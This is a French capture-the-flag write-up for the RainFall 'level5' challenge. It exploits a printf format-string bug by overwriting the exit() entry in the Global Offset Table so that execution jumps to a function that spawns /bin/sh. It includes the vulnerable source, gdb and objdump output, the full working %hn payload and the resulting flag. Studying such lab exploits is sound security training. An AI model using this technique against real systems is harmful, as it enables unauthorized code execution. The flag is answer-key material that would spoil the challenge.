Read also: [./Resources/README.md](./Resources/README.md)

# Source

```c
void o(void) {
  system("/bin/sh");
  _exit(1);
}

void n(void) {
  char local_20c [520];
 
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  exit(1);
}

void main(void) {
  n();
  return;
}
```

# Explication

On doit appeler la fonction `o`, pour faire cela, d’après les documents fournis en ressource, on doit récupérer
l’adresse d’`exit` (de la libc) dans la Global Offset Table pour ensuite essayer de modifier cette adresse
vers la fonction qu’on souhaite :

```
(gdb) p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>

level5@RainFall:~$ (python -c "print('aaaa%p %p %p %p %p %p %p %p')"; cat) | ./level5
aaaa0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025
```

Ressources :

 - https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf 
 - https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf
   ![6.1.1 GOT overwrite](https://i.imgur.com/hnl9VDZ.png)

```
level5@RainFall:~$ objdump –dynamic-reloc level5

level5:   file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE           VALUE
08049814 R_386_GLOB_DAT __gmon_start__
08049848 R_386_COPY     stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

On récupère l’adresse de la fonction `exit`, on obtient :

```
level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08%33952x%4$hn")'; cat) | ./level5
```

Avec `h`, on réécrit seulement les 2 derniers bits (= short int) au lieu des 4 d’un int par ceux correspondant
à la fonction `o` (car les deux premiers bits de `exit` sont les même que la fonction `o`).

On obtient donc le flag !

```
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
